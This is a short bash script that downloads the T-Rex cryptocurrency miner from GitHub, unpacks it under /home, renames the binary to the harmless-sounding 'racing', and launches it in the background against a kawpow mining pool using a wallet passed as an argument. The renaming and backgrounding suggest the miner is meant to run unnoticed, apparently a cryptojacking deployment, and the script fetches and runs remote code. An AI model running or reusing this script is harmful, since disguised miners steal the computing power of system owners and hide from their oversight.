#!/bin/bash
cd /home
wget https://github.com/trexminer/T-Rex/releases/download/0.26.5/t-rex-0.26.5-linux.tar.gz
tar xvzf t-rex-0.26.5-linux.tar.gz
mv t-rex racing
./racing -a kawpow -o stratum+tcp://pool.woolypooly.com:3106 -u $1 -p x $2 &